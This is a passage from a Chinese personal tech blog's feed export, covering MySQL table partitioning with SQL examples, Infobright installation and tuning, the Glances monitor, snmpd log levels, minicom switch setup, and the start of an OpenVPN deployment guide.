<p>参考资料《MySQL技术内幕Innodb存储引擎》<br>&nbsp;</p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Mysql分区管理]]></title>
      <url>/2014/08/19/mysql-e5-88-86-e5-8c-ba-e7-ae-a1-e7-90-86-2.html</url>
      <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>很长时间没写博客了，这两天一直在学习Mysql分区，总结下:<br>Mysql支持水平分区，并不支持垂直分区;<br><strong>水平分区</strong>：指将同一表中不同行的记录分配到不同的物理文件中；<br><strong>垂直分区</strong>：指将同一表中不同列的记录分配到不同的物理文件中；<br>其中CSV、FEDORATED、MERGE等引擎不支持分区，MYISAM、InnoDB、NDB等引擎支持分区</p>
<h4 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h4><p>将一个表或索引分解为多个更小、更可管理的部分，从逻辑上讲，只有一个表或者索引，但是物理上这个表或者索引可能由数十个物理分区组成；没个分区都是独立的对象，可以独自处理，也可以作为一个更大对象的一部分进行处理（如果分区表很大，亦可以将分区分配到不同的磁盘上去）；在执行查询的时候，优化器会根据分区定义过滤哪些没有我们需要数据的分区，这样查询就无须全表扫描所有分区，只查找包含需要数据的分区即可</p>
<h4 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h4><p>1、表非常大以至于无法全部都放到内存，或者只在表的最后部分有热点数据，其他均为历史数据 2、分区表数据更容易维护（可独立对分区进行优化、检查、修复及批量删除大数据可以采用drop分区的形式等） 3、分区表的数据可以分布在不同的物理设备上，从而高效地利用多个硬件设备 4、分区表可以避免某些特殊的瓶颈（ps: InnoDB的单个索引的互斥访问、ext3文件系统的inode锁竞争等） 5、可以备份和恢复独立的分区，非常适用于大数据集的场景</p>
<h4 id="分区表限制"><a href="#分区表限制" class="headerlink" title="分区表限制"></a>分区表限制</h4><ol>
<li>单表最多支持1024个分区</li>
<li>MySQL5.1只能对数据表的整型列进行分区，或者数据列可以通过分区函数转化成整型列;MySQL5.5的RANGE LIST类型可以直接使用列进行分区</li>
<li>如果分区字段中有主键或唯一索引的列，那么所有的主键列和唯一索引列都必须包含进来</li>
<li>分区表无法使用外键约束</li>
<li>分区必须使用相同的Engine</li>
<li>对于MyISAM分区表，不能在使用LOAD INDEX INTO CACHE操作</li>
<li>对于MyISAM分区表，使用时会打开更多的文件描述符（单个分区是一个独立的文件）</li>
</ol>
<h4 id="分区策略"><a href="#分区策略" class="headerlink" title="分区策略"></a>分区策略</h4><ol>
<li>全量扫描数据，不需要任何索引：通过where条件大概定位哪个分区，必须将查询所需要扫描的分区个数限制在很小的数量</li>
<li>建立分区索引，分离热点：如将明显的热点数据分离到一个分区，使其尽量缓存到内存中，这样就能充分使用索引和缓存<br><strong>注意</strong>：以上策略均以查询得到过滤，丢掉额外的分区，分区本身不产生额外的代价为准则】</li>
</ol>
<h5 id="分区表使用过程的坑坑"><a href="#分区表使用过程的坑坑" class="headerlink" title="分区表使用过程的坑坑"></a>分区表使用过程的坑坑</h5><p>1.NULL值会使分区过滤无效:<br>分表的表达式的值可以是NULL，第一个分区为特殊分区存放NULL或者非法值<br>如： PARTITION BY RANGE YEAR(order_date)进行分区，那么order_date为NULL或者非法值，记录存放在第一个分区:<br>WHERE order_date BETWEEN ‘2014-01-01’ AND ‘2014-01-31’查询时会检查两个分区：<br>第一个分区及1月份分区，避免第一分区数据过大时造成查询代价过高，可以使用：建立第一分区专门存放order_date为NULL和非法值记录 PARTITION p_nulls VALUES LESS THAN(0)<br>MySQL5.5以后可以才用一下语法解决问题： PARTITION BY RANGE COLUMNS(order_date)</p>
<p>2.分区列和索引列不匹配<br>此种情况下查询无法进行分区过滤，分区失效除非查询中包含了可以过滤分区的条件</p>
<p>3.RANGE类型分区随着分区数量增加会对MYSQL额外增加查询分区定义列表（符合条件行在哪个分区）的压力，尽量限制适当的分区数量;key和hash类型分区不存在此问题</p>
<p>4.重组分区或者类似alter语句可能会造成很大的开销<br>新建或者删除分区操作很快，重组分区或者类似ALTER语句操作会先创建一个临时的分区，将数据复制其中，然后在删除原分区</p>
<h4 id="分区表类型"><a href="#分区表类型" class="headerlink" title="分区表类型"></a>分区表类型</h4><p>1.RANGE分区：行数据基于属于一个给定连续区间的列值被放入分区<br>MySQL5.5开始支持RANGE COLUMNS的分区（引入Columns分区解决了MySQL 5.5版本之前RANGE分区和LIST分区只支持整数分区，从而导致需要额外的函数计算得到整数或者通过额外的转换表来转换为整数再分区的问题。Columns分区可以细分为RANGE Columns分区和LIST Columns分区，RANGE Columns分区和LIST Columns分区都支持整数、日期时间、字符串三大数据类型）</p>
<p>2.LIST分区：类似于按RANGE分区，区别在于LIST分区是基于列值匹配一个离散值集合中的某个值来进行选择。<br>MySQL5.5开始支持RANGE COLUMNS的分区</p>
<p>3.HASH分区：根据用户自定义的表达式的返回值来进行分区，返回值不能为负数 4.KEY分区：根据MySQLS数据库提供的哈希函数来进行分区 【注：无论创建何种类型的分区，如果表中存在主键或唯一索引时，分区列必须是唯一索引的一个组成部分】</p>
<h4 id="分区表相关操作"><a href="#分区表相关操作" class="headerlink" title="分区表相关操作"></a>分区表相关操作</h4><h4 id="分区相关查询"><a href="#分区相关查询" class="headerlink" title="分区相关查询"></a>分区相关查询</h4><pre class="lang:pgsql decode:true">查看当前数据库是否支持分区
mysql&gt; show variables like '%partition%';
+---------------------------------------+-------+
| Variable_name | Value |
+---------------------------------------+-------+
| have_partitioning | YES |
| innodb_adaptive_hash_index_partitions | 1 |
+---------------------------------------+-------+
2 rows in set

查看创建分区表的CREATE语句

mysql&gt;show create table operation_log;

查看表是否为分区表(Create_options)
mysql&gt;show table status(当前库所有表状态)
mysql&gt;show table status from lockrank like '%operation_log%';(lockrank库operation_log表状态)
*************************** 1\. row ***************************
Table: operation_log
Create Table: CREATE TABLE `operation_log` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `cid` mediumint(7) unsigned NOT NULL,
  `accountid` mediumint(8) NOT NULL DEFAULT '0' ,
  `flag` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `addtime` int(11) unsigned NOT NULL,
  `device` tinyint(1) unsigned NOT NULL DEFAULT '1' ,
  PRIMARY KEY (`id`,`addtime`),
  KEY `idx_accountid_addtime` (`accountid`,`addtime`),
  KEY `idx_accountid_flag` (`accountid`,`flag`),
) ENGINE=InnoDB AUTO_INCREMENT=50951039 DEFAULT CHARSET=utf8 COMMENT='操作记录'
/*!50100 PARTITION BY RANGE (addtime)
(PARTITION `2013-05` VALUES LESS THAN (1370016000) ENGINE = InnoDB,
 PARTITION `2013-06` VALUES LESS THAN (1372608000) ENGINE = InnoDB,
 PARTITION `2013-07` VALUES LESS THAN (1375286400) ENGINE = InnoDB,
 PARTITION `2013-08` VALUES LESS THAN (1377964800) ENGINE = InnoDB,
 PARTITION `2013-09` VALUES LESS THAN (1380556800) ENGINE = InnoDB,
 PARTITION `2013-10` VALUES LESS THAN (1383235200) ENGINE = InnoDB,
 PARTITION `2013-11` VALUES LESS THAN (1385827200) ENGINE = InnoDB,
 PARTITION `2013-12` VALUES LESS THAN (1388505600) ENGINE = InnoDB,
 PARTITION `2014-01` VALUES LESS THAN (1391184000) ENGINE = InnoDB,
 PARTITION `2014-02` VALUES LESS THAN (1393603200) ENGINE = InnoDB,
 PARTITION `2014-03` VALUES LESS THAN (1396281600) ENGINE = InnoDB,
 PARTITION `2014-04` VALUES LESS THAN (1398873600) ENGINE = InnoDB,
 PARTITION `2014-05` VALUES LESS THAN (1401552000) ENGINE = InnoDB,
 PARTITION `2014-06` VALUES LESS THAN (1404144000) ENGINE = InnoDB,
 PARTITION `2014-07` VALUES LESS THAN (1406822400) ENGINE = InnoDB,
 PARTITION `2014-08` VALUES LESS THAN (1409500800) ENGINE = InnoDB,
 PARTITION `2014-09` VALUES LESS THAN MAXVALUE ENGINE = InnoDB) */
1 row in set (0.00 sec)

查看select如何使用分区
mysql&gt; explain partitions select id,accountid,cid,flag from operation_log where addtime="1369362524" \G ;
 *************************** 1\. row ***************************
   id: 1
  select_type: SIMPLE
table: operation_log
   partitions: 2013-05
 type: ALL
possible_keys: NULL
  key: NULL
  key_len: NULL
  ref: NULL
 rows: 4384356
Extra: Using where
1 row in set (0.00 sec)
``
分区表元数据统计表：INFORMATION_SCHEMA.PARTITIONS
查看分区表operation_log的分区信息
mysql&gt; SELECT partition_name part, partition_expression expr, partition_description descr, table_rows FROM INFORMATION_SCHEMA.partitions WHERE TABLE_SCHEMA = schema() AND TABLE_NAME='operation_log';
+---------+---------+------------+------------+
| part| expr| descr | table_rows |
+---------+---------+------------+------------+
| 2013-05 | addtime | 1370016000 | 5999642 |
| 2013-06 | addtime | 1372608000 | 4579263 |
| 2013-07 | addtime | 1375286400 | 3223772 |
| 2013-08 | addtime | 1377964800 | 1995058 |
| 2013-09 | addtime | 1380556800 | 2497406 |
| 2013-10 | addtime | 1383235200 | 4106974 |
| 2013-11 | addtime | 1385827200 | 6209559 |
| 2013-12 | addtime | 1388505600 | 6415349 |
| 2014-01 | addtime | 1391184000 | 3953594 |
| 2014-02 | addtime | 1393603200 | 0 |
| 2014-03 | addtime | 1396281600 | 0 |
| 2014-04 | addtime | 1398873600 | 0 |
| 2014-05 | addtime | 1401552000 | 0 |
| 2014-06 | addtime | 1404144000 | 0 |
| 2014-07 | addtime | 1406822400 | 0 |
| 2014-08 | addtime | 1409500800 | 0 |
| 2014-09 | addtime | MAXVALUE | 0 |
+---------+---------+------------+------------+
17 rows in set (1.48 sec)</pre>

<h5 id="创建分区操作"><a href="#创建分区操作" class="headerlink" title="创建分区操作"></a>创建分区操作</h5><pre class="lang:mysql decode:true">RANGE分区：
mysql&gt; CREATE TABLE `operation_log` (
 -&gt;  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
 -&gt; `cid` mediumint(7) unsigned NOT NULL,
 -&gt; `accountid` mediumint(8) NOT NULL DEFAULT '0' ,
 -&gt;  `flag` tinyint(1) unsigned NOT NULL DEFAULT '0',
 -&gt;  `addtime` int(11) unsigned NOT NULL,
 -&gt; `device` tinyint(1) unsigned NOT NULL DEFAULT '1' ,
 -&gt;  PRIMARY KEY (`id`,`addtime`),
 -&gt; KEY `idx_accountid_addtime` (`accountid`,`addtime`),
 -&gt;  KEY `idx_accountid_flag` (`accountid`,`flag`),
 -&gt;) ENGINE=InnoDB AUTO_INCREMENT=50951039 DEFAULT CHARSET=utf8 COMMENT='操作记录'
 -&gt;/*!50100 PARTITION BY RANGE (addtime)
 -&gt;(PARTITION `2013-05` VALUES LESS THAN (1370016000) ENGINE = InnoDB,
 -&gt; PARTITION `2013-06` VALUES LESS THAN (1372608000) ENGINE = InnoDB,
 -&gt; PARTITION `2013-07` VALUES LESS THAN (1375286400) ENGINE = InnoDB,
 -&gt; PARTITION `2013-08` VALUES LESS THAN (1377964800) ENGINE = InnoDB,
 -&gt; PARTITION `2013-09` VALUES LESS THAN MAXVALUE ENGINE = InnoDB) */；
1 row in set (0.00 sec)
（ LESS THAN MAXVALUE考虑到可能的最大值）

list分区
//这种方式失败
mysql&gt; CREATE TABLE IF NOT EXISTS `list_part` (
 -&gt;   `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '用户ID',
 -&gt;   `province_id` int(2) NOT NULL DEFAULT 0 COMMENT '省',
 -&gt;   `name` varchar(50) NOT NULL DEFAULT '' COMMENT '名称',
 -&gt;   `sex` int(1) NOT NULL DEFAULT '0' COMMENT '0为男，1为女',
 -&gt;   PRIMARY KEY (`id`)
 -&gt; ) ENGINE=INNODB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1
 -&gt; PARTITION BY LIST (province_id) (
 -&gt; PARTITION p0 VALUES IN (1,2,3,4,5,6,7,8),
 -&gt; PARTITION p1 VALUES IN (9,10,11,12,16,21),
 -&gt; PARTITION p2 VALUES IN (13,14,15,19),
 -&gt; PARTITION p3 VALUES IN (17,18,20,22,23,24)
 -&gt; );
ERROR 1503 (HY000): A PRIMARY KEY must include all columns in the table's partitioning function

//这种方式成功
mysql&gt; CREATE TABLE IF NOT EXISTS `list_part` (
 -&gt;   `id` int(11) NOT NULL  COMMENT '用户ID',
 -&gt;   `province_id` int(2) NOT NULL DEFAULT 0 COMMENT '省',
 -&gt;   `name` varchar(50) NOT NULL DEFAULT '' COMMENT '名称',
 -&gt;   `sex` int(1) NOT NULL DEFAULT '0' COMMENT '0为男，1为女'
 -&gt; ) ENGINE=INNODB  DEFAULT CHARSET=utf8
 -&gt; PARTITION BY LIST (province_id) (
 -&gt; PARTITION p0 VALUES IN (1,2,3,4,5,6,7,8),
 -&gt; PARTITION p1 VALUES IN (9,10,11,12,16,21),
 -&gt; PARTITION p2 VALUES IN (13,14,15,19),
 -&gt; PARTITION p3 VALUES IN (17,18,20,22,23,24)
 -&gt; );
Query OK, 0 rows affected (0.33 sec)
上面的这个创建list分区时，如果有主銉的话，分区时主键必须在其中，不然就会报错。如果我不用主键，分区就创建成功了，一般情况下，一个张表肯定会有一个主键，这算是一个分区的局限性

hash分区
mysql&gt; CREATE TABLE IF NOT EXISTS `hash_part` (
 -&gt;   `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '评论ID',
 -&gt;   `comment` varchar(1000) NOT NULL DEFAULT '' COMMENT '评论',
 -&gt;   `ip` varchar(25) NOT NULL DEFAULT '' COMMENT '来源IP',
 -&gt;   PRIMARY KEY (`id`)
 -&gt; ) ENGINE=INNODB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1
 -&gt; PARTITION BY HASH(id)
 -&gt; PARTITIONS 3;
Query OK, 0 rows affected (0.06 sec)

key分区 
mysql&gt; CREATE TABLE IF NOT EXISTS `key_part` (
 -&gt;   `news_id` int(11) NOT NULL  COMMENT '新闻ID',
 -&gt;   `content` varchar(1000) NOT NULL DEFAULT '' COMMENT '新闻内容',
 -&gt;   `u_id` varchar(25) NOT NULL DEFAULT '' COMMENT '来源IP',
 -&gt;   `create_time` DATE NOT NULL DEFAULT '0000-00-00 00:00:00' COMMENT '时间'
 -&gt; ) ENGINE=INNODB  DEFAULT CHARSET=utf8
 -&gt; PARTITION BY LINEAR HASH(YEAR(create_time))
 -&gt; PARTITIONS 3;
Query OK, 0 rows affected (0.07 sec)</pre>

<h5 id="增加子分区操作"><a href="#增加子分区操作" class="headerlink" title="增加子分区操作"></a><strong>增加子分区操作</strong></h5><pre><code>子分区是分区表中每个分区的再次分割，子分区既可以使用HASH希分区，也可以使用KEY分区。这 也被称为复合分区（composite partitioning）
</code></pre><pre class="lang:mysql decode:true ">1\. 如果一个分区中创建了子分区，其他分区也要有子分区
2\. 如果创建了了分区，每个分区中的子分区数必有相同
3\. 同一分区内的子分区，名字不相同，不同分区内的子分区名子可以相同（5.1.50不适用）

 mysql&gt; CREATE TABLE IF NOT EXISTS `sub_part` (
 -&gt;   `news_id` int(11) NOT NULL  COMMENT '新闻ID',
 -&gt;   `content` varchar(1000) NOT NULL DEFAULT '' COMMENT '新闻内容',
 -&gt;   `u_id` int(11) NOT NULL DEFAULT 0s COMMENT '来源IP',
 -&gt;   `create_time` DATE NOT NULL DEFAULT '0000-00-00 00:00:00' COMMENT '时间'
 -&gt; ) ENGINE=INNODB  DEFAULT CHARSET=utf8
 -&gt; PARTITION BY RANGE(YEAR(create_time))
 -&gt; SUBPARTITION BY HASH(TO_DAYS(create_time))(
 -&gt; PARTITION p0 VALUES LESS THAN (1990)(SUBPARTITION s0,SUBPARTITION s1,SUBPARTITION s2),
 -&gt; PARTITION p1 VALUES LESS THAN (2000)(SUBPARTITION s3,SUBPARTITION s4,SUBPARTITION good),
 -&gt; PARTITION p2 VALUES LESS THAN MAXVALUE(SUBPARTITION tank0,SUBPARTITION tank1,SUBPARTITION tank3)
 -&gt; );
Query OK, 0 rows affected (0.07 sec)</pre>

<h5 id="分区管理"><a href="#分区管理" class="headerlink" title="分区管理"></a><strong>分区管理</strong></h5><pre class="lang:mysql decode:true ">增加分区操作（针对设置MAXVALUE）
 range添加分区
mysql&gt;alter table operation_log add  partition(partition `2013-10` values less than (1383235200));  ---&gt;适用于没有设置MAXVALUE的分区添加
   ERROR 1481 (HY000):MAXVALUE can only be used in last partition definition
mysql&gt;alter table operation_log REORGANIZE partition `2013-09` into (partition `2013-09` values less than (1380556800),partition `2013-10` values less than (1383235200),partition `2013-11` values less than maxvalue);

 list添加分区
mysql&gt; alter table list_part add partition(partition p4 values in (25,26,28));
Query OK, 0 rows affected (0.01 sec)
Records: 0  Duplicates: 0  Warnings: 0

 hash重新分区
mysql&gt; alter table list_part add partition(partition p4 values in (25,26,28));
Query OK, 0 rows affected (0.01 sec)
Records: 0  Duplicates: 0  Warnings: 0

 key重新分区
mysql&gt; alter table key_part add partition partitions 4;
Query OK, 1 row affected (0.06 sec)//有数据也会被重新分配
Records: 1  Duplicates: 0  Warnings: 0

子分区添加新分区，虽然我没有指定子分区，但是系统会给子分区命名的
mysql&gt; alter table sub1_part add partition(partition p3 values less than MAXVALUE);
Query OK, 0 rows affected (0.02 sec)
Records: 0  Duplicates: 0  Warnings: 0</pre>

<h5 id="删除分区操作"><a href="#删除分区操作" class="headerlink" title="删除分区操作"></a><strong>删除分区操作</strong></h5><pre class="lang:php decode:true ">alter table user drop partition `2013-05`;</pre>

<h4 id="分区表其他操作"><a href="#分区表其他操作" class="headerlink" title="分区表其他操作"></a>分区表其他操作</h4><p><pre class="lang:mysql decode:true ">重建分区(官方：与先drop所有记录然后reinsert是一样的效果；用于整理表碎片)<br>alter table operation_log rebuild partition <code>2014-01</code>;<br>重建多个分区<br>alter table operation_log rebuild partition <code>2014-01</code>,<code>2014-02</code>;<br>过程如下：</pre></p>
<p>pro<br>优化分区（如果删除了一个分区的大量记录或者对一个分区的varchar blob text数据类型的字段做了许多更新，此时可以对分区进行优化以回收未使用的空间和整理分区数据文件）<br>alter table operation_log  optimize  partition <code>2014-01</code>;</p>
<p>优化的操作相当于check partition,analyze partition 和repair patition</p>
<p>分析分区<br>alter table operation_log  analyze partition  <code>2014-01</code>;</p>
<p>修复分区<br>alter table operation_log repair partition   <code>2014-01</code>;</p>
<p>检查分区<br>alter table operation_log check  partition   <code>2014-01</code>;<br><strong>注释：</strong></p>
<ol>
<li>mysqlcheck、myisamchk并不支持分区表，analyze,check,optimize,rebuild,repair,truncate不支持子分区操作</li>
<li>在MySQL5.6中，可以使用清空一个分区数据：alter table operation_log truncate partition <code>2014-01</code>;</li>
<li>清空该分区表所有分区数据：alter table operation_log truncate partition all;</li>
</ol>
<p><strong>参考文档：</strong></p>
<p><a href="http://blog.51yip.com/mysql/1013.html" target="_blank" rel="external">http://blog.51yip.com/mysql/1013.html</a><br><a href="https://dev.mysql.com/doc/refman/5.6/en/partitioning-maintenance.html" target="_blank" rel="external">https://dev.mysql.com/doc/refman/5.6/en/partitioning-maintenance.html</a><br><a href="http://dev.mysql.com/doc/refman/5.6/en/index.html" target="_blank" rel="external">http://dev.mysql.com/doc/refman/5.6/en/index.html</a></p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Infobright数据仓库安装及参数优化]]></title>
      <url>/2014/08/19/infobright-e6-95-b0-e6-8d-ae-e4-bb-93-e5-ba-93-e5-ae-89-e8-a3-85-e5-8f-8a-e5-8f-82-e6-95-b0-e4-bc-98-e5-8c-96.html</url>
      <content type="html"><![CDATA[<p><strong>一、认知Infobright数据仓库</strong></p>
<ol>
<li>Infobright是开源的DATA Warehouse，可以作为Mysql的存储引擎（BRIGHTHOUSE）使用，select查询与Mysql无区别</li>
<li>适用于基于Mysql架构下的OLAP，区分为ICE（社区版免费）和IEE（企业版商业授权）</li>
<li>千万级的查询性能比MyISAM、InnoDB等快5-60倍，且数据量很大时，查询性能基本在同一个数量级，适合聚合查询（SUM,COUNT，AVG，GROUP BY）</li>
<li>列式存储，无需建索引和分区，高压缩比40:1（官方数字）</li>
<li>ICE和IEE版本的区别和限制<br><a href="https://www.infobright.org/index.php/Learn-More/ICE_IEE_Comparison/" target="_blank" rel="external">https://www.infobright.org/index.php/Learn-More/ICE_IEE_Comparison/</a></li>
</ol>
<p><strong>二、Infobright基本安装初始化</strong></p>
<p><pre class="lang:php decode:true"> wget <a href="http://www.infobright.org/downloads/ice/infobright-4.0.7-0-x86_64-ice.rpm" target="_blank" rel="external">http://www.infobright.org/downloads/ice/infobright-4.0.7-0-x86_64-ice.rpm</a><br> rpm -ivh infobright-4.0.7-0-x86_64-ice.rpm –prefix=/usr/local/</pre></p>
<p> A.初始化数据库：<br> /usr/local/infobright/scripts/mysql_install_db –datadir=/data/data/ –basedir=/usr/local/infobright-4.0.7-x86_64/ –force<br>   安装之后会生成<br>  /etc/my-ib.cnf.inactive （主配置文件，下面两个暂不讨论）</p>
<p><pre class="lang:php decode:true">/etc/my-ib-master.cnf<br>  /etc/my-ib-slave.cnf<br>  /etc/rc.d/init.d/mysqld-ib（启动脚本）<br>  mv  /etc/my-ib.cnf.inactive /etc/my-ib.cnf<br>  修改/etc/rc.d/init.d/mysqld-ib /etc/my-ib.cnf  的datadir basedir参数到指定位置<br>  修改权限chown mysql.mysql /etc/my-ib*  /data/data /ibcache/cachedata</pre></p>
<p> B.修改warehouse引擎配置文件<br>  /data/data/brighthouse.ini<br> C.参数优化<br>   CacheFolder = /ibcache/cachedata/<br>   ServerMainHeapSize = 28000<br>   ServerCompressedHeapSize = 4000<br>   LoaderMainHeapSize = 800<br>   ControlMessages = 3<br>   KNFolder = BH_RSI_Repository<br>   AllowMySQLQueryPath = 0<br><strong>注释：</strong></p>
<p>CacheFolder 临时数据目录，用于缓存处理查询的中间结果集，与Datadir相异为宜，可用空间大于20G<br>ServerMainHeapSize IB主线程内存，一般设置为物理内存一半；若可能尽量增加<br>ServerCompressedHeapSize 服务进程的压缩堆栈空间，存放压缩数据<br>LoaderMainHeapSize Bhloader数据导入缓冲区，随目标表的列数增加而调整，loader进程的堆栈空间，一般最大不超过800M<br>ControlMessages 控制盒查询日志的信息量级别（1-3之间）<br>KNFolder 知识网络目录，默认在datadir目录下<br>AllowMySQLQueryPath 是否支持Mysql原生的SQL查询，支持修改为1，否则0<br>启动infobright：service mysqld-ib start</p>
<p><strong>ICE版本导入数据方式：
</strong>BRIGHTHOUSE<br>load data infile ‘/data/data.txt’ into table t fields terminated by ‘ ’;</p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> infobright </tag>
            
            <tag> 列式数据库 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux系统监控实用工具Glances]]></title>
      <url>/2014/03/12/linux-e7-b3-bb-e7-bb-9f-e7-9b-91-e6-8e-a7-e5-ae-9e-e7-94-a8-e5-b7-a5-e5-85-b7glances.html</url>
      <content type="html"><![CDATA[<h4 id="Linux系统监控实用工具Glances"><a href="#Linux系统监控实用工具Glances" class="headerlink" title="Linux系统监控实用工具Glances"></a>Linux系统监控实用工具Glances</h4><ul>
<li><h5 id="Glances安装"><a href="#Glances安装" class="headerlink" title="Glances安装"></a>Glances安装</h5><p><a href="http://nicolargo.github.io/glances/" target="_blank" rel="external">Glances</a>安装要求:python &gt;= 2.6 和 psutil &gt;= 0.4.1</p>
<pre># pip install psutil
# pip install pysensors
# pip install hddtemp
# git clone https://github.com/nicolargo/glances.git
# cd glances
# python setup.py install</pre>
</li>
<li><h5 id="Glances的使用"><a href="#Glances的使用" class="headerlink" title="Glances的使用"></a>Glances的使用</h5><p><pre># glances -h<br>Glances version 1.7a with PsUtil 0.7.1<br>Usage: glances [opt]<br>with opt:<br>-b        Display network rate in Byte per second<br>-B @IP|host    Bind server to the given IP or host NAME<br>-c @IP|host    Connect to a Glances server<br>-C file        Path to the configuration file<br>-d        Disable disk I/O module<br>-e        Enable the sensors module (Linux-only)<br>-f file        Set the output folder (HTML) or file (CSV)<br>-h        Display the syntax and exit<br>-m        Disable mount module<br>-n        Disable network module<br>-o output    Define additional output (available: HTML or CSV)<br>-p PORT        Define the client or server TCP port (default: 61209)<br>-P password    Client/server password<br>-r        Do not list processes (significant CPU use reduction)<br>-s        Run Glances in server mode<br>-t sec        Set the refresh time in seconds (default: 3)<br>-v        Display the version and exit<br>-y        Enable the hddtemp module (needs running hddtemp daemon)<br>-z        Do not use the bold color attribute<br>-1        Start Glances in per CPU mode</pre><br><div><a href="http://www.simlinux.com/old/wp-content/uploads/2014/03/glances.png"><img src="http://www.simlinux.com/old/wp-content/uploads/2014/03/glances-300x156.png" alt="glances"></a></div><br>&nbsp;</p>
</li>
</ul>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
]]></content>
      
        <categories>
            
            <category> 系统监控 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> glances </tag>
            
            <tag> 系统监控 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[设置snmp输出到message的日志级别]]></title>
      <url>/2014/03/04/e8-ae-be-e7-bd-aesnmp-e8-be-93-e5-87-ba-e5-88-b0message-e7-9a-84-e6-97-a5-e5-bf-97-e7-ba-a7-e5-88-ab.html</url>
      <content type="html"><![CDATA[<p><strong>修改snmp服务的启动脚本</strong><br>vim /etc/rc.d/init.d/snmpd<br>将<br>OPTIONS=”-LS0-6d -Lf /dev/null -p /var/run/snmpd.pid “<br>改成<br>OPTIONS=”-Ls3d -Lf /dev/null -p /var/run/snmpd.pid”<br>services snmpd restart</p>
<p><strong>snmpd日志等级的定义:</strong><br>0 或 ! —- LOG_EMERG<br>1 或 a —- LOG_ALERT<br>2 或 c —- LOG_CRIT<br>3 或 e —- LOG_ERR<br>4 或 w —- LOG_WARNING<br>5 或 n —- LOG_NOTICE<br>6 或 i —- LOG_INFO<br>7 或 d —- LOG_DEBUG</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> log </tag>
            
            <tag> snmpd </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[linux下使用minicom配置交换机]]></title>
      <url>/2013/12/26/linux-e4-b8-8b-e4-bd-bf-e7-94-a8minicom-e9-85-8d-e7-bd-ae-e4-ba-a4-e6-8d-a2-e6-9c-ba-2.html</url>
      <content type="html"><![CDATA[<p><strong>前提</strong>：正确将com线连接好<br>1.安装minicom<br>安装epel源，yum -y install minicom</p>
<p>2.配置minicom<br>[root@localhost ~]#  minicom -s<br><a href="http://www.simlinux.com/old/wp-content/uploads/2013/12/c.png"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/12/c.png" alt="c"></a></p>
<p><a href="http://www.simlinux.com/old/wp-content/uploads/2013/12/D.png"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/12/D.png" alt="D"></a></p>
<p>&nbsp;</p>
<p>配置好后回车，这里选择Save setup as dfl  然后Exit 即将连接com</p>
<p><a href="http://www.simlinux.com/old/wp-content/uploads/2013/12/e.png"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/12/e.png" alt="e"></a></p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> minicom </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CentOS6.4下部署OpenVpn服务及使用方法]]></title>
      <url>/2013/12/17/centos6-4-e4-b8-8b-e9-83-a8-e7-bd-b2openvpn-e6-9c-8d-e5-8a-a1-e5-8f-8a-e4-bd-bf-e7-94-a8-e6-96-b9-e6-b3-95.html</url>
      <content type="html"><![CDATA[<div><strong><span style="font-family: 'Microsoft Yahei';">环境说明：</span></strong></div><br><div><span style="font-family: 'Microsoft Yahei';">vpn服务器：<strong>eth0</strong>:120.3.243.54（外网IP）  <strong>eth1：</strong>192.168.5.253（私网IP）</span></div><br><div><span style="font-family: 'Microsoft Yahei';">客户端地址：201.1.36.111 </span></div><br><div><span style="font-family: 'Microsoft Yahei';">软件版本：服务端OpenVPN 2.3.2  </span></div><br><div><span style="font-family: 'Microsoft Yahei';">实现：访问公司内网及授权vpn地址访问的网段，其他地址均走客户端本地上网</span></div><br><div><strong><span style="font-family: 'Microsoft Yahei';">安装步骤：</span></strong></div><br><div><span style="font-family: 'Microsoft Yahei';">设置EPEL源</span></div><br><div><span style="font-family: 'Microsoft Yahei';">rpm -Uvh <a href="http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm" target="_blank" rel="external">http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm</a></span></div><br><div><span style="font-family: 'Microsoft Yahei';">rpm –import /etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-6</span></div><br><div><span style="font-family: 'Microsoft Yahei';"> </span></div><br><div><span style="font-family: 'Microsoft Yahei';"> </span></div><br><div><span style="font-family: 'Microsoft Yahei';">翻墙下载源码：</span></div><br><div><a href="http://swupdate.openvpn.org/community/releases/openvpn-2.3.2.tar.gz" target="_blank" rel="external"><span style="font-family: 'Microsoft Yahei';">http://swupdate.openvpn.org/community/releases/openvpn-2.3.2.tar.gz</span></a></div><br><div><span style="font-family: 'Microsoft Yahei';">./configure &amp;&amp; make &amp;&amp; make install</span></div><br><div><span style="font-family: 'Microsoft Yahei';"> </span></div><br><div><span style="font-family: 'Microsoft Yahei';">证书生成工具</span></div><br><div><br><br>yum -y install easy-rsa<br>配置OpenVpn：<br>mkdir /etc/openvpn/etc -p<br>cp -R /usr/share/easy-rsa/ /etc/openvpn/<br>源码目录：<br>cp 